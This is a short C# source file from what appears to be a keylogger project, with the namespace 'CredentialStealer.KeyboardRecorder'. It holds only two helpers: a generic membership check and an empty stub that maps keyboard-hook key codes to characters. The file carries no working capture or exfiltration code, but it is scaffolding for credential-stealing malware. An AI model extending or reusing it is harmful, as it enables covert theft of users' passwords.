using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using RamGecTools;

namespace CredentialStealer.KeyboardRecorder
{
    public static class Extensions
    {

       


        public static bool In<T>(this T val, params T[] values) where T : struct
        {
            return values.Contains(val);
        }

        public static string GetChar(this KeyboardHook.VKeys key) {

            return ""; 
        }
    }

    
}
